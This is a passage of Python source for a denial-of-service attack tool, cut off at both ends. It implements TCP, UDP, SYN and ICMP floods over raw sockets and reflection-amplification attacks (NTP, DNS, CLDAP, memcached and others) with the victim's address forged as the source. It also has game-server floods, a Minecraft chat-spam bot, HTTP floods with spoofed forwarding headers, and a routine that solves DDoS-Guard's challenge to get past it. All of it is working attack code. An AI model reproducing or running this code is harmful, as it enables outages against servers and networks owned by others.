'onion.lu',\n            'onion.casa',\n            'onion.com.de',\n            'onion.foundation',\n            'onion.rodeo',\n            'onion.lat',\n            'tor2web.org',\n            'tor2web.fi',\n            'tor2web.blutmagie.de',\n            'tor2web.to',\n            'tor2web.io',\n            'tor2web.in',\n            'tor2web.it',\n            'tor2web.xyz',\n            'tor2web.su',\n            'darknet.to',\n            's1.tor-gateways.de',\n            's2.tor-gateways.de',\n            's3.tor-gateways.de',\n            's4.tor-gateways.de',\n            's5.tor-gateways.de'\n        ]\n\nwith open(__dir__ / \"config.json\") as f:\n    con = load(f)\n\nwith socket(AF_INET, SOCK_DGRAM) as s:\n    s.connect((\"8.8.8.8\", 80))\n    __ip__ = s.getsockname()[0]\n\n\nclass bcolors:\n    HEADER = '\\033[95m'\n    OKBLUE = '\\033[94m'\n    OKCYAN = '\\033[96m'\n    OKGREEN = '\\033[92m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    RESET = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n\n\ndef exit(*message):\n    if message:\n        logger.error(bcolors.FAIL + \" \".join(message) + bcolors.RESET)\n    shutdown()\n    _exit(1)\n\n\nclass Methods:\n    LAYER7_METHODS: Set[str] = {\n        \"CFB\", \"BYPASS\", \"GET\", \"POST\", \"OVH\", \"STRESS\", \"DYN\", \"SLOW\", \"HEAD\",\n        \"NULL\", \"COOKIE\", \"PPS\", \"EVEN\", \"GSB\", \"DGB\", \"AVB\", \"CFBUAM\",\n        \"APACHE\", \"XMLRPC\", \"BOT\", \"BOMB\", \"DOWNLOADER\", \"KILLER\", \"TOR\", \"RHEX\", \"STOMP\"\n    }\n\n    LAYER4_AMP: Set[str] = {\n        \"MEM\", \"NTP\", \"DNS\", \"ARD\",\n        \"CLDAP\", \"CHAR\", \"RDP\"\n    }\n\n    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,\n                                \"TCP\", \"UDP\", \"SYN\", \"VSE\", \"MINECRAFT\",\n                                \"MCBOT\", \"CONNECTION\", \"CPS\", \"FIVEM\",\n                                \"TS3\", \"MCPE\", \"ICMP\"\n                                }\n\n    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}\n\n\ngoogle_agents = [\n    \"Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\",\n    \"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, \"\n    \"like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; \"\n    \"+http://www.google.com/bot.html)) \"\n    \"Googlebot/2.1 (+http://www.google.com/bot.html)\",\n    \"Googlebot/2.1 (+http://www.googlebot.com/bot.html)\"\n]\n\n\nclass Counter:\n    def __init__(self, value=0):\n        self._value = RawValue('i', value)\n\n    def __iadd__(self, value):\n        self._value.value += value\n        return self\n\n    def __int__(self):\n        return self._value.value\n\n    def set(self, value):\n        self._value.value = value\n        return self\n\n\nREQUESTS_SENT = Counter()\nBYTES_SEND = Counter()\n\n\nclass Tools:\n    IP = compile(\"(?:\\d{1,3}\\.){3}\\d{1,3}\")\n    protocolRex = compile('\"protocol\":(\\d+)')\n\n    @staticmethod\n    def humanbytes(i: int, binary: bool = False, precision: int = 2):\n        MULTIPLES = [\n            \"B\", \"k{}B\", \"M{}B\", \"G{}B\", \"T{}B\", \"P{}B\", \"E{}B\", \"Z{}B\", \"Y{}B\"\n        ]\n        if i > 0:\n            base = 1024 if binary else 1000\n            multiple = trunc(log2(i) / log2(base))\n            value = i / pow(base, multiple)\n            suffix = MULTIPLES[multiple].format(\"i\" if binary else \"\")\n            return f\"{value:.{precision}f} {suffix}\"\n        else:\n            return \"-- B\"\n\n    @staticmethod\n    def humanformat(num: int, precision: int = 2):\n        suffixes = ['', 'k', 'm', 'g', 't', 'p']\n        if num > 999:\n            obje = sum(\n                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])\n            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'\n        else:\n            return num\n\n    @staticmethod\n    def sizeOfRequest(res: Response) -> int:\n        size: int = len(res.request.method)\n        size += len(res.request.url)\n        size += len('\\r\\n'.join(f'{key}: {value}'\n                                for key, value in res.request.headers.items()))\n        return size\n\n    @staticmethod\n    def send(sock: socket, packet: bytes):\n        global BYTES_SEND, REQUESTS_SENT\n        if not sock.send(packet):\n            return False\n        BYTES_SEND += len(packet)\n        REQUESTS_SENT += 1\n        return True\n\n    @staticmethod\n    def sendto(sock, packet, target):\n        global BYTES_SEND, REQUESTS_SENT\n        if not sock.sendto(packet, target):\n            return False\n        BYTES_SEND += len(packet)\n        REQUESTS_SENT += 1\n        return True\n\n    @staticmethod\n    def dgb_solver(url, ua, pro=None):\n        s = None\n        idss = None\n        with Session() as s:\n            if pro:\n                s.proxies = pro\n            hdrs = {\n                \"User-Agent\": ua,\n                \"Accept\": \"text/html\",\n                \"Accept-Language\": \"en-US\",\n                \"Connection\": \"keep-alive\",\n                \"Sec-Fetch-Dest\": \"document\",\n                \"Sec-Fetch-Mode\": \"navigate\",\n                \"Sec-Fetch-Site\": \"none\",\n                \"Sec-Fetch-User\": \"?1\",\n                \"TE\": \"trailers\",\n                \"DNT\": \"1\"\n            }\n            with s.get(url, headers=hdrs) as ss:\n                for key, value in ss.cookies.items():\n                    s.cookies.set_cookie(cookies.create_cookie(key, value))\n            hdrs = {\n                \"User-Agent\": ua,\n                \"Accept\": \"*/*\",\n                \"Accept-Language\": \"en-US,en;q=0.5\",\n                \"Accept-Encoding\": \"gzip, deflate\",\n                \"Referer\": url,\n                \"Sec-Fetch-Dest\": \"script\",\n                \"Sec-Fetch-Mode\": \"no-cors\",\n                \"Sec-Fetch-Site\": \"cross-site\"\n            }\n            with s.post(\"https://check.ddos-guard.net/check.js\", headers=hdrs) as ss:\n                for key, value in ss.cookies.items():\n                    if key == '__ddg2':\n                        idss = value\n                    s.cookies.set_cookie(cookies.create_cookie(key, value))\n\n            hdrs = {\n                \"User-Agent\": ua,\n                \"Accept\": \"image/webp,*/*\",\n                \"Accept-Language\": \"en-US,en;q=0.5\",\n                \"Accept-Encoding\": \"gzip, deflate\",\n                \"Cache-Control\": \"no-cache\",\n                \"Referer\": url,\n                \"Sec-Fetch-Dest\": \"script\",\n                \"Sec-Fetch-Mode\": \"no-cors\",\n                \"Sec-Fetch-Site\": \"cross-site\"\n            }\n            with s.get(f\"{url}.well-known/ddos-guard/id/{idss}\", headers=hdrs) as ss:\n                for key, value in ss.cookies.items():\n                    s.cookies.set_cookie(cookies.create_cookie(key, value))\n                return s\n\n        return False\n\n    @staticmethod\n    def safe_close(sock=None):\n        if sock:\n            sock.close()\n\n\nclass Minecraft:\n    @staticmethod\n    def varint(d: int) -> bytes:\n        o = b''\n        while True:\n            b = d & 0x7F\n            d >>= 7\n            o += data_pack(\"B\", b | (0x80 if d > 0 else 0))\n            if d == 0:\n                break\n        return o\n\n    @staticmethod\n    def data(*payload: bytes) -> bytes:\n        payload = b''.join(payload)\n        return Minecraft.varint(len(payload)) + payload\n\n    @staticmethod\n    def short(integer: int) -> bytes:\n        return data_pack('>H', integer)\n\n    @staticmethod\n    def long(integer: int) -> bytes:\n        return data_pack('>q', integer)\n\n    @staticmethod\n    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:\n        return Minecraft.data(Minecraft.varint(0x00),\n                              Minecraft.varint(version),\n                              Minecraft.data(target[0].encode()),\n                              Minecraft.short(target[1]),\n                              Minecraft.varint(state))\n\n    @staticmethod\n    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:\n        return Minecraft.data(Minecraft.varint(0x00),\n                              Minecraft.varint(version),\n                              Minecraft.data(\n                                  target[0].encode(),\n                                  b\"\\x00\",\n                                  ip.encode(),\n                                  b\"\\x00\",\n                                  uuid.hex.encode()\n                              ),\n                              Minecraft.short(target[1]),\n                              Minecraft.varint(state))\n\n    @staticmethod\n    def login(protocol: int, username: str) -> bytes:\n        if isinstance(username, str):\n            username = username.encode()\n        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \\\n                                               0x01 if protocol >= 385 else \\\n                                               0x00),\n                              Minecraft.data(username))\n\n    @staticmethod\n    def keepalive(protocol: int, num_id: int) -> bytes:\n        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \\\n                                               0x10 if protocol >= 712 else \\\n                                               0x0F if protocol >= 471 else \\\n                                               0x10 if protocol >= 464 else \\\n                                               0x0E if protocol >= 389 else \\\n                                               0x0C if protocol >= 386 else \\\n                                               0x0B if protocol >= 345 else \\\n                                               0x0A if protocol >= 343 else \\\n                                               0x0B if protocol >= 336 else \\\n                                               0x0C if protocol >= 318 else \\\n                                               0x0B if protocol >= 107 else \\\n                                               0x00),\n                              Minecraft.long(num_id) if protocol >= 339 else \\\n                              Minecraft.varint(num_id))\n\n    @staticmethod\n    def chat(protocol: int, message: str) -> bytes:\n        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \\\n                                               0x03 if protocol >= 464 else \\\n                                               0x02 if protocol >= 389 else \\\n                                               0x01 if protocol >= 343 else \\\n                                               0x02 if protocol >= 336 else \\\n                                               0x03 if protocol >= 318 else \\\n                                               0x02 if protocol >= 107 else \\\n                                               0x01),\n                              Minecraft.data(message.encode()))\n\n\n# noinspection PyBroadException,PyUnusedLocal\nclass Layer4(Thread):\n    _method: str\n    _target: Tuple[str, int]\n    _ref: Any\n    SENT_FLOOD: Any\n    _amp_payloads = cycle\n    _proxies: List[Proxy] = None\n\n    def __init__(self,\n                 target: Tuple[str, int],\n                 ref: List[str] = None,\n                 method: str = \"TCP\",\n                 synevent: Event = None,\n                 proxies: Set[Proxy] = None,\n                 protocolid: int = 74):\n        Thread.__init__(self, daemon=True)\n        self._amp_payload = None\n        self._amp_payloads = cycle([])\n        self._ref = ref\n        self.protocolid = protocolid\n        self._method = method\n        self._target = target\n        self._synevent = synevent\n        if proxies:\n            self._proxies = list(proxies)\n\n        self.methods = {\n            \"UDP\": self.UDP,\n            \"SYN\": self.SYN,\n            \"VSE\": self.VSE,\n            \"TS3\": self.TS3,\n            \"MCPE\": self.MCPE,\n            \"FIVEM\": self.FIVEM,\n            \"MINECRAFT\": self.MINECRAFT,\n            \"CPS\": self.CPS,\n            \"CONNECTION\": self.CONNECTION,\n            \"MCBOT\": self.MCBOT,\n        }\n\n    def run(self) -> None:\n        if self._synevent: self._synevent.wait()\n        self.select(self._method)\n        while self._synevent.is_set():\n            self.SENT_FLOOD()\n\n    def open_connection(self,\n                        conn_type=AF_INET,\n                        sock_type=SOCK_STREAM,\n                        proto_type=IPPROTO_TCP):\n        if self._proxies:\n            s = randchoice(self._proxies).open_socket(\n                conn_type, sock_type, proto_type)\n        else:\n            s = socket(conn_type, sock_type, proto_type)\n        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)\n        s.settimeout(.9)\n        s.connect(self._target)\n        return s\n\n    def TCP(self) -> None:\n        s = None\n        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:\n            while Tools.send(s, randbytes(1024)):\n                continue\n        Tools.safe_close(s)\n\n    def MINECRAFT(self) -> None:\n        handshake = Minecraft.handshake(self._target, self.protocolid, 1)\n        ping = Minecraft.data(b'\\x00')\n\n        s = None\n        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:\n            while Tools.send(s, handshake):\n                Tools.send(s, ping)\n        Tools.safe_close(s)\n\n    def CPS(self) -> None:\n        global REQUESTS_SENT\n        s = None\n        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:\n            REQUESTS_SENT += 1\n        Tools.safe_close(s)\n\n    def alive_connection(self) -> None:\n        s = None\n        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:\n            while s.recv(1):\n                continue\n        Tools.safe_close(s)\n\n    def CONNECTION(self) -> None:\n        global REQUESTS_SENT\n        with suppress(Exception):\n            Thread(target=self.alive_connection).start()\n            REQUESTS_SENT += 1\n\n    def UDP(self) -> None:\n        s = None\n        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:\n            while Tools.sendto(s, randbytes(1024), self._target):\n                continue\n        Tools.safe_close(s)\n\n    def ICMP(self) -> None:\n        payload = self._genrate_icmp()\n        s = None\n        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:\n            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)\n            while Tools.sendto(s, payload, self._target):\n                continue\n        Tools.safe_close(s)\n\n    def SYN(self) -> None:\n        s = None\n        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:\n            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)\n            while Tools.sendto(s, self._genrate_syn(), self._target):\n                continue\n        Tools.safe_close(s)\n\n    def AMP(self) -> None:\n        s = None\n        with suppress(Exception), socket(AF_INET, SOCK_RAW,\n                                         IPPROTO_UDP) as s:\n            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)\n            while Tools.sendto(s, *next(self._amp_payloads)):\n                continue\n        Tools.safe_close(s)\n\n    def MCBOT(self) -> None:\n        s = None\n\n        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:\n            Tools.send(s, Minecraft.handshake_forwarded(self._target,\n                                                        self.protocolid,\n                                                        2,\n                                                        ProxyTools.Random.rand_ipv4(),\n                                                        uuid4()))\n            username = f\"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}\"\n            password = b64encode(username.encode()).decode()[:8].title()\n            Tools.send(s, Minecraft.login(self.protocolid, username))\n            \n            sleep(1.5)\n\n            Tools.send(s, Minecraft.chat(self.protocolid, \"/register %s %s\" % (password, password)))\n            Tools.send(s, Minecraft.chat(self.protocolid, \"/login %s\" % password))\n\n            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):\n                sleep(1.1)\n\n        Tools.safe_close(s)\n\n    def VSE(self) -> None:\n        global BYTES_SEND, REQUESTS_SENT\n        payload = (b'\\xff\\xff\\xff\\xff\\x54\\x53\\x6f\\x75\\x72\\x63\\x65\\x20\\x45\\x6e\\x67\\x69\\x6e\\x65'\n                   b'\\x20\\x51\\x75\\x65\\x72\\x79\\x00')\n        with socket(AF_INET, SOCK_DGRAM) as s:\n            while Tools.sendto(s, payload, self._target):\n                continue\n        Tools.safe_close(s)\n\n    def FIVEM(self) -> None:\n        global BYTES_SEND, REQUESTS_SENT\n        payload = b'\\xff\\xff\\xff\\xffgetinfo xxx\\x00\\x00\\x00'\n        with socket(AF_INET, SOCK_DGRAM) as s:\n            while Tools.sendto(s, payload, self._target):\n                continue\n        Tools.safe_close(s)\n\n    def TS3(self) -> None:\n        global BYTES_SEND, REQUESTS_SENT\n        payload = b'\\x05\\xca\\x7f\\x16\\x9c\\x11\\xf9\\x89\\x00\\x00\\x00\\x00\\x02'\n        with socket(AF_INET, SOCK_DGRAM) as s:\n            while Tools.sendto(s, payload, self._target):\n                continue\n        Tools.safe_close(s)\n\n    def MCPE(self) -> None:\n        global BYTES_SEND, REQUESTS_SENT\n        payload = (b'\\x61\\x74\\x6f\\x6d\\x20\\x64\\x61\\x74\\x61\\x20\\x6f\\x6e\\x74\\x6f\\x70\\x20\\x6d\\x79\\x20\\x6f'\n                   b'\\x77\\x6e\\x20\\x61\\x73\\x73\\x20\\x61\\x6d\\x70\\x2f\\x74\\x72\\x69\\x70\\x68\\x65\\x6e\\x74\\x20'\n                   b'\\x69\\x73\\x20\\x6d\\x79\\x20\\x64\\x69\\x63\\x6b\\x20\\x61\\x6e\\x64\\x20\\x62\\x61\\x6c\\x6c'\n                   b'\\x73')\n        with socket(AF_INET, SOCK_DGRAM) as s:\n            while Tools.sendto(s, payload, self._target):\n                continue\n        Tools.safe_close(s)\n\n    def _genrate_syn(self) -> bytes:\n        ip: IP = IP()\n        ip.set_ip_src(__ip__)\n        ip.set_ip_dst(self._target[0])\n        tcp: TCP = TCP()\n        tcp.set_SYN()\n        tcp.set_th_flags(0x02)\n        tcp.set_th_dport(self._target[1])\n        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))\n        ip.contains(tcp)\n        return ip.get_packet()\n\n    def _genrate_icmp(self) -> bytes:\n        ip: IP = IP()\n        ip.set_ip_src(__ip__)\n        ip.set_ip_dst(self._target[0])\n        icmp: ICMP = ICMP()\n        icmp.set_icmp_type(icmp.ICMP_ECHO)\n        icmp.contains(Data(b\"A\" * ProxyTools.Random.rand_int(16, 1024)))\n        ip.contains(icmp)\n        return ip.get_packet()\n\n    def _generate_amp(self):\n        payloads = []\n        for ref in self._ref:\n            ip: IP = IP()\n            ip.set_ip_src(self._target[0])\n            ip.set_ip_dst(ref)\n\n            ud: UDP = UDP()\n            ud.set_uh_dport(self._amp_payload[1])\n            ud.set_uh_sport(self._target[1])\n\n            ud.contains(Data(self._amp_payload[0]))\n            ip.contains(ud)\n\n            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))\n        return payloads\n\n    def select(self, name):\n        self.SENT_FLOOD = self.TCP\n        for key, value in self.methods.items():\n            if name == key:\n                self.SENT_FLOOD = value\n            elif name == \"ICMP\":\n                self.SENT_FLOOD = self.ICMP\n                self._target = (self._target[0], 0)\n            elif name == \"RDP\":\n                self._amp_payload = (\n                    b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',\n                    3389)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"CLDAP\":\n                self._amp_payload = (\n                    b'\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00'\n                    b'\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x63\\x6c\\x61\\x73\\x73\\x30\\x00',\n                    389)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"MEM\":\n                self._amp_payload = (\n                    b'\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00gets p h e\\n', 11211)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"CHAR\":\n                self._amp_payload = (b'\\x01', 19)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"ARD\":\n                self._amp_payload = (b'\\x00\\x14\\x00\\x00', 3283)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"NTP\":\n                self._amp_payload = (b'\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00', 123)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n            elif name == \"DNS\":\n                self._amp_payload = (\n                    b'\\x45\\x67\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x73\\x6c\\x00\\x00\\xff\\x00\\x01\\x00'\n                    b'\\x00\\x29\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00',\n                    53)\n                self.SENT_FLOOD = self.AMP\n                self._amp_payloads = cycle(self._generate_amp())\n\n\n# noinspection PyBroadException,PyUnusedLocal\nclass HttpFlood(Thread):\n    _proxies: List[Proxy] = None\n    _payload: str\n    _defaultpayload: Any\n    _req_type: str\n    _useragents: List[str]\n    _referers: List[str]\n    _target: URL\n    _method: str\n    _rpc: int\n    _synevent: Any\n    SENT_FLOOD: Any\n\n    def __init__(self,\n                 thread_id: int,\n                 target: URL,\n                 host: str,\n                 method: str = \"GET\",\n                 rpc: int = 1,\n                 synevent: Event = None,\n                 useragents: Set[str] = None,\n                 referers: Set[str] = None,\n                 proxies: Set[Proxy] = None) -> None:\n        Thread.__init__(self, daemon=True)\n        self.SENT_FLOOD = None\n        self._thread_id = thread_id\n        self._synevent = synevent\n        self._rpc = rpc\n        self._method = method\n        self._target = target\n        self._host = host\n        self._raw_target = (self._host, (self._target.port or 80))\n\n        if not self._target.host[len(self._target.host) - 1].isdigit():\n            self._raw_target = (self._host, (self._target.port or 80))\n\n        self.methods = {\n            \"POST\": self.POST,\n            \"CFB\": self.CFB,\n            \"CFBUAM\": self.CFBUAM,\n            \"XMLRPC\": self.XMLRPC,\n            \"BOT\": self.BOT,\n            \"APACHE\": self.APACHE,\n            \"BYPASS\": self.BYPASS,\n            \"DGB\": self.DGB,\n            \"OVH\": self.OVH,\n            \"AVB\": self.AVB,\n            \"STRESS\": self.STRESS,\n            \"DYN\": self.DYN,\n            \"SLOW\": self.SLOW,\n            \"GSB\": self.GSB,\n            \"RHEX\": self.RHEX,\n            \"STOMP\": self.STOMP,\n            \"NULL\": self.NULL,\n            \"COOKIE\": self.COOKIES,\n            \"TOR\": self.TOR,\n            \"EVEN\": self.EVEN,\n            \"DOWNLOADER\": self.DOWNLOADER,\n            \"BOMB\": self.BOMB,\n            \"PPS\": self.PPS,\n            \"KILLER\": self.KILLER,\n        }\n\n        if not referers:\n            referers: List[str] = [\n                \"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=\",\n                \",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer\"\n                \"/sharer.php?u=\",\n                \",https://drive.google.com/viewerng/viewer?url=\",\n                \",https://www.google.com/translate?u=\"\n            ]\n        self._referers = list(referers)\n        if proxies:\n            self._proxies = list(proxies)\n\n        if not useragents:\n            useragents: List[str] = [\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',\n                'Safari/537.36',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ',\n                'Safari/537.36',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ',\n                'Safari/537.36',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',\n                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',\n                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',\n                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',\n                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',\n                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',\n                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',\n                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',\n                'Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',\n                'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'\n            ]\n        self._useragents = list(useragents)\n        self._req_type = self.getMethodType(method)\n        self._defaultpayload = \"%s %s HTTP/%s\\r\\n\" % (self._req_type,\n                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))\n        self._payload = (self._defaultpayload +\n                         'Accept-Encoding: gzip, deflate, br\\r\\n'\n                         'Accept-Language: en-US,en;q=0.9\\r\\n'\n                         'Cache-Control: max-age=0\\r\\n'\n                         'Connection: keep-alive\\r\\n'\n                         'Sec-Fetch-Dest: document\\r\\n'\n                         'Sec-Fetch-Mode: navigate\\r\\n'\n                         'Sec-Fetch-Site: none\\r\\n'\n                         'Sec-Fetch-User: ?1\\r\\n'\n                         'Sec-Gpc: 1\\r\\n'\n                         'Pragma: no-cache\\r\\n'\n                         'Upgrade-Insecure-Requests: 1\\r\\n')\n\n    def select(self, name: str) -> None:\n        self.SENT_FLOOD = self.GET\n        for key, value in self.methods.items():\n            if name == key:\n                self.SENT_FLOOD = value\n                \n    def run(self) -> None:\n        if self._synevent: self._synevent.wait()\n        self.select(self._method)\n        while self._synevent.is_set():\n            self.SENT_FLOOD()\n\n    @property\n    def SpoofIP(self) -> str:\n        spoof: str = ProxyTools.Random.rand_ipv4()\n        return (\"X-Forwarded-Proto: Http\\r\\n\"\n                f\"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\\r\\n\"\n                f\"Via: {spoof}\\r\\n\"\n                f\"Client-IP: {spoof}\\r\\n\"\n                f'X-Forwarded-For: {spoof}\\r\\n'\n                f'Real-IP: {spoof}\\r\\n')\n\n    def generate_payload(self, other: str = None) -> bytes:\n        return str.encode((self._payload +\n                           f\"Host: {self._target.authority}\\r\\n\" +\n                           self.randHeadercontent +\n                           (other if other else \"\") +\n                           \"\\r\\n\"))\n\n    def open_connection(self, host=None) -> socket:\n        if self._proxies:\n            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)\n        else:\n            sock = socket(AF_INET, SOCK_STREAM)\n\n        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)\n        sock.settimeout(.9)\n        sock.connect(host or self._raw_target)\n\n        if self._target.scheme.lower() == \"https\":\n            sock = ctx.wrap_socket(sock,\n                                   server_hostname=host[0] if host else self._target.host,\n                                   server_side=False,\n                                   do_handshake_on_connect=True,\n                                   suppress_ragged_eofs=True)\n        return sock\n\n    @property\n    def randHeadercontent(self) -> str:\n        return (f\"User-Agent: 